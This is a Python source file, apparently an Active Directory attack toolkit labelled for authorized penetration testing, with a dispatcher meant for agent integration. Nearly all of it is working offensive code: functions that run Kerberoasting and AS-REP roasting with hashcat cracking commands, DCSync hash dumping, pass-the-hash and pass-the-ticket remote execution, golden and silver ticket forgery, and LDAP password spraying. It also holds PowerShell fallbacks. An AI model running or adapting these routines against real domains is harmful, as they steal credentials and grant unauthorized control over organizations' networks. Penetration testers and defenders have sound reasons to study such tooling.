"""
Active Directory Attack Toolkit — authorized penetration testing only.
Kerberoasting, AS-REP roasting, DCSync, BloodHound ingestion, Pass-the-Hash/Ticket,
Golden/Silver ticket, ACL abuse, LDAP enumeration.

Requires: impacket (pip install impacket), bloodhound-python (optional)
"""
import os, subprocess, base64, json, socket, struct, time, random, hashlib

# ── LDAP Enumeration ──────────────────────────────────────────────────────────
def ldap_enum(dc_ip: str, domain: str, user: str = "", password: str = "",
              ntlm_hash: str = "") -> str:
    """
    Enumerate AD via LDAP: users, groups, SPNs, domain trusts, GPOs.
    Uses impacket's GetADUsers/ldapdomaindump if available, else raw ldapsearch.
    """
    results = []
    results.append(f"[*] LDAP enum: {domain} @ {dc_ip}")

    # Try impacket
    auth = f"-dc-ip {dc_ip} {domain}/"
    if ntlm_hash:
        auth += f"{user} -hashes :{ntlm_hash}"
    elif user and password:
        auth += f"{user}:{password}"
    else:
        auth += f"-no-pass"

    cmds = [
        f"GetADUsers.py -all {auth}",
        f"ldapdomaindump.py {auth} -o /tmp/ldd_{domain}",
    ]
    for c in cmds:
        try:
            out = subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT,
                                           timeout=30).decode(errors="replace")
            results.append(f"[{c.split()[0]}]\n{out[:2000]}")
        except Exception as e:
            results.append(f"[{c.split()[0]}] failed: {e}")

    # Fallback: raw ldapsearch
    try:
        bind = f"-D '{user}@{domain}' -w '{password}'" if user else "-x"
        out = subprocess.check_output(
            f"ldapsearch {bind} -H ldap://{dc_ip} -b 'DC={domain.replace('.', ',DC=')}' "
            f"'(objectClass=user)' sAMAccountName userPrincipalName servicePrincipalName "
            f"memberOf 2>&1 | head -200",
            shell=True, timeout=20).decode(errors="replace")
        results.append(f"[ldapsearch]\n{out[:3000]}")
    except Exception as e:
        results.append(f"[ldapsearch] not available: {e}")

    return "\n\n".join(results)


# ── Kerberoasting ─────────────────────────────────────────────────────────────
def kerberoast(dc_ip: str, domain: str, user: str, password: str = "",
               ntlm_hash: str = "", output_file: str = "/tmp/kerberoast.txt") -> str:
    """
    Request TGS for all SPN accounts. Saves hashes in hashcat -m 13100 format.
    """
    auth = f"-dc-ip {dc_ip} {domain}/{user}"
    auth += f" -hashes :{ntlm_hash}" if ntlm_hash else f":{password}" if password else " -no-pass"

    cmd = f"GetUserSPNs.py {auth} -request -outputfile {output_file} 2>&1"
    try:
        out = subprocess.check_output(cmd, shell=True, timeout=60,
                                       stderr=subprocess.STDOUT).decode(errors="replace")
        hashes = ""
        if os.path.exists(output_file):
            hashes = open(output_file).read()
            os.remove(output_file)
        return (f"[Kerberoast] {domain}\n{out[:1000]}\n\n"
                f"=== Hashes ({hashes.count(chr(10))} found) ===\n{hashes[:4000]}\n\n"
                f"Crack: hashcat -m 13100 kerberoast.txt rockyou.txt")
    except FileNotFoundError:
        return ("GetUserSPNs.py not found — install impacket:\n"
                "pip install impacket\n\n"
                "Manual (Windows PS):\n"
                "Add-Type -AssemblyName System.IdentityModel\n"
                "$spns=([adsisearcher]\"serviceprincipalname=*\").FindAll()\n"
                "foreach($s in $spns){ $spn=$s.Properties['serviceprincipalname'][0]; "
                "[System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::new($spn) }")
    except Exception as e:
        return f"Kerberoast failed: {e}"


# ── AS-REP Roasting ───────────────────────────────────────────────────────────
def asrep_roast(dc_ip: str, domain: str, users_file: str = "",
                output_file: str = "/tmp/asrep.txt") -> str:
    """
    AS-REP roast accounts with DONT_REQ_PREAUTH flag set.
    No credentials required.
    """
    user_arg = f"-usersfile {users_file}" if users_file and os.path.exists(users_file) \
               else "-no-preauth '' -format hashcat"
    cmd = f"GetNPUsers.py {domain}/ {user_arg} -dc-ip {dc_ip} -outputfile {output_file} 2>&1"
    try:
        out = subprocess.check_output(cmd, shell=True, timeout=30,
                                       stderr=subprocess.STDOUT).decode(errors="replace")
        hashes = ""
        if os.path.exists(output_file):
            hashes = open(output_file).read()
        return (f"[AS-REP Roast] {domain}\n{out[:1000]}\n\n"
                f"=== Hashes ===\n{hashes[:4000]}\n\n"
                f"Crack: hashcat -m 18200 asrep.txt rockyou.txt")
    except FileNotFoundError:
        return ("GetNPUsers.py not found — install impacket\n\n"
                "Manual: LDAP filter: (userAccountControl:1.2.840.113556.1.4.803:=4194304)")
    except Exception as e:
        return f"AS-REP roast failed: {e}"


# ── DCSync ────────────────────────────────────────────────────────────────────
def dcsync(dc_ip: str, domain: str, user: str, password: str = "",
           ntlm_hash: str = "", target_user: str = "Administrator") -> str:
    """
    DCSync — replicate DC hashes via MS-DRSR.
    Requires Domain Admin or Replication privileges.
    """
    auth = f"{domain}/{user}"
    auth += f" -hashes :{ntlm_hash}" if ntlm_hash else f":{password}"
    cmd = f"secretsdump.py {auth} -dc-ip {dc_ip} -just-dc-user {target_user} 2>&1"
    try:
        out = subprocess.check_output(cmd, shell=True, timeout=30,
                                       stderr=subprocess.STDOUT).decode(errors="replace")
        return f"[DCSync] {target_user}@{domain}\n{out[:5000]}"
    except FileNotFoundError:
        return ("secretsdump.py not found — install impacket\n\n"
                "Note: Requires DS-Replication-Get-Changes + DS-Replication-Get-Changes-All\n"
                "      Default: Domain Admins, Enterprise Admins, SYSTEM")
    except Exception as e:
        return f"DCSync failed: {e}"


# ── Pass-the-Hash ─────────────────────────────────────────────────────────────
def pass_the_hash(target: str, domain: str, user: str, ntlm_hash: str,
                  command: str = "whoami") -> str:
    """
    PTH via impacket's psexec/wmiexec/smbexec.
    """
    results = []
    auth    = f"{domain}/{user} -hashes :{ntlm_hash}"
    for tool in ["wmiexec.py", "psexec.py", "smbexec.py"]:
        cmd = f"{tool} {auth}@{target} '{command}' 2>&1"
        try:
            out = subprocess.check_output(cmd, shell=True, timeout=20,
                                           stderr=subprocess.STDOUT).decode(errors="replace")
            results.append(f"[{tool}] {out[:500]}")
            break
        except Exception as e:
            results.append(f"[{tool}] failed: {e}")
    return "\n".join(results) or "PTH failed — install impacket"


# ── Pass-the-Ticket ───────────────────────────────────────────────────────────
def pass_the_ticket(ccache_path: str, target: str, command: str = "whoami") -> str:
    """
    Set KRB5CCNAME and run psexec against target.
    """
    os.environ["KRB5CCNAME"] = ccache_path
    cmd = f"psexec.py -k -no-pass {target} '{command}' 2>&1"
    try:
        out = subprocess.check_output(cmd, shell=True, timeout=20,
                                       stderr=subprocess.STDOUT).decode(errors="replace")
        return f"[PTT] {out[:1000]}"
    except Exception as e:
        return f"PTT failed: {e}"


# ── Golden Ticket ─────────────────────────────────────────────────────────────
def golden_ticket(domain: str, domain_sid: str, krbtgt_hash: str,
                  username: str = "Administrator",
                  output_ccache: str = "/tmp/golden.ccache") -> str:
    """
    Forge golden ticket with ticketer.py.
    Requires: domain SID + krbtgt NTLM hash (from DCSync).
    """
    cmd = (f"ticketer.py -nthash {krbtgt_hash} -domain-sid {domain_sid} "
           f"-domain {domain} {username} 2>&1")
    try:
        out = subprocess.check_output(cmd, shell=True, timeout=15,
                                       stderr=subprocess.STDOUT).decode(errors="replace")
        ccache = f"{username}.ccache"
        if os.path.exists(ccache):
            import shutil
            shutil.move(ccache, output_ccache)
        return (f"[Golden Ticket]\n{out[:1000]}\n\n"
                f"Use: export KRB5CCNAME={output_ccache}\n"
                f"     psexec.py -k -no-pass {domain}/{username}@<DC> cmd.exe")
    except FileNotFoundError:
        return ("ticketer.py not found — install impacket\n\n"
                "Golden ticket requires:\n"
                "  1. Domain SID:    Get-ADDomain | select DomainSID\n"
                "  2. krbtgt hash:   secretsdump.py domain/admin@dc -just-dc-user krbtgt\n"
                "  3. Run ticketer.py (impacket)")
    except Exception as e:
        return f"Golden ticket failed: {e}"


# ── Silver Ticket ─────────────────────────────────────────────────────────────
def silver_ticket(domain: str, domain_sid: str, service_hash: str,
                  target_host: str, service: str = "cifs",
                  username: str = "Administrator") -> str:
    """
    Forge silver ticket for specific service (no DC contact needed).
    Requires service account NTLM hash.
    """
    cmd = (f"ticketer.py -nthash {service_hash} -domain-sid {domain_sid} "
           f"-domain {domain} -spn {service}/{target_host} {username} 2>&1")
    try:
        out = subprocess.check_output(cmd, shell=True, timeout=15,
                                       stderr=subprocess.STDOUT).decode(errors="replace")
        return (f"[Silver Ticket] {service}/{target_host}\n{out[:1000]}\n\n"
                f"Use: export KRB5CCNAME={username}.ccache\n"
                f"     smbclient.py -k {target_host}/C$ (for cifs)")
    except Exception as e:
        return f"Silver ticket failed: {e}"


# ── BloodHound Collection ─────────────────────────────────────────────────────
def bloodhound_collect(dc_ip: str, domain: str, user: str, password: str = "",
                        ntlm_hash: str = "",
                        collection: str = "All",
                        output_dir: str = "/tmp/bh") -> str:
    """
    Run bloodhound-python to collect AD data for BloodHound analysis.
    """
    os.makedirs(output_dir, exist_ok=True)
    auth = f"-d {domain} -u {user}"
    auth += f" --hashes :{ntlm_hash}" if ntlm_hash else f" -p '{password}'" if password else " --auth-method auto"
    cmd = (f"bloodhound-python {auth} -dc {dc_ip} "
           f"-c {collection} --zip -o {output_dir} 2>&1")
    try:
        out = subprocess.check_output(cmd, shell=True, timeout=120,
                                       stderr=subprocess.STDOUT).decode(errors="replace")
        zips = [f for f in os.listdir(output_dir) if f.endswith(".zip")]
        return (f"[BloodHound] {domain}\n{out[:1000]}\n\n"
                f"Output: {', '.join(zips) if zips else 'no zip found'}\n"
                f"Import into BloodHound GUI:\n"
                f"  neo4j start && bloodhound\n"
                f"  Drag {output_dir}/*.zip into the GUI")
    except FileNotFoundError:
        return ("bloodhound-python not installed:\n"
                "pip install bloodhound\n\n"
                "Or use SharpHound.exe on Windows:\n"
                "SharpHound.exe -c All --zipfilename bh.zip")
    except Exception as e:
        return f"BloodHound collection failed: {e}"


# ── ACL Abuse ─────────────────────────────────────────────────────────────────
def acl_enum(dc_ip: str, domain: str, user: str, password: str = "") -> str:
    """
    Enumerate potentially abusable ACLs (GenericAll, GenericWrite, WriteDACL, etc.)
    via LDAP. Useful to find privilege escalation paths without Domain Admin.
    """
    ldap_filter = (
        "(&(objectClass=*)"
        "(|(nTSecurityDescriptor=*GenericAll*)"
        "(nTSecurityDescriptor=*GenericWrite*)"
        "(nTSecurityDescriptor=*WriteDACL*)"
        "(nTSecurityDescriptor=*WriteOwner*)))"
    )
    bind = f"-D '{user}@{domain}' -w '{password}'" if user and password else "-x"
    cmd = (f"ldapsearch {bind} -H ldap://{dc_ip} "
           f"-b 'DC={domain.replace('.', ',DC=')}' "
           f"'(objectClass=user)' nTSecurityDescriptor distinguishedName 2>&1 | head -150")
    try:
        out = subprocess.check_output(cmd, shell=True, timeout=20,
                                       stderr=subprocess.STDOUT).decode(errors="replace")
        return (f"[ACL Enum] {domain}\n{out[:3000]}\n\n"
                "Interpret with: python3 dacledit.py (impacket-dev) or BloodHound GUI\n"
                "Abusable ACEs:\n"
                "  GenericAll    → full control (reset pwd, add to group, DCSync)\n"
                "  GenericWrite  → modify attributes (add SPN for Kerberoast)\n"
                "  WriteDACL     → grant yourself extra rights\n"
                "  WriteOwner    → take ownership, then WriteDACL")
    except Exception as e:
        return f"ACL enum failed: {e}"


# ── LDAP Password Spray ───────────────────────────────────────────────────────
def ldap_spray(dc_ip: str, domain: str, users: list, password: str,
               delay: float = 2.0) -> list:
    """
    Spray single password against user list via LDAP bind.
    Returns list of valid (user, pass) tuples.
    """
    hits = []
    try:
        import ldap3
    except ImportError:
        return [f"ldap3 not installed — pip install ldap3"]

    server = ldap3.Server(dc_ip, get_info=ldap3.ALL, connect_timeout=5)
    for user in users:
        try:
            conn = ldap3.Connection(server, user=f"{domain}\\{user}", password=password,
                                     authentication=ldap3.NTLM, auto_bind=True)
            if conn.bound:
                hits.append((user, password))
                conn.unbind()
        except Exception:
            pass
        time.sleep(delay + random.uniform(0, 0.5))
    return hits


# ── Quick dispatch ────────────────────────────────────────────────────────────
def run(cmd: str, **kwargs) -> str:
    """Dispatch string commands (for agent integration)."""
    c = cmd.upper().split()[0]
    if c == "LDAP_ENUM":
        return ldap_enum(kwargs.get("dc","127.0.0.1"), kwargs.get("domain",""),
                          kwargs.get("user",""), kwargs.get("password",""),
                          kwargs.get("ntlm_hash",""))
    if c == "KERBEROAST":
        return kerberoast(kwargs.get("dc","127.0.0.1"), kwargs.get("domain",""),
                           kwargs.get("user",""), kwargs.get("password",""),
                           kwargs.get("ntlm_hash",""))
    if c == "ASREP_ROAST":
        return asrep_roast(kwargs.get("dc","127.0.0.1"), kwargs.get("domain",""))
    if c == "DCSYNC":
        return dcsync(kwargs.get("dc","127.0.0.1"), kwargs.get("domain",""),
                       kwargs.get("user",""), kwargs.get("password",""),
                       kwargs.get("ntlm_hash",""), kwargs.get("target","Administrator"))
    if c == "BLOODHOUND":
        return bloodhound_collect(kwargs.get("dc","127.0.0.1"), kwargs.get("domain",""),
                                   kwargs.get("user",""), kwargs.get("password",""))
    if c == "GOLDEN_TICKET":
        return golden_ticket(kwargs.get("domain",""), kwargs.get("sid",""),
                              kwargs.get("krbtgt_hash",""))
    return f"Unknown AD command: {cmd}"
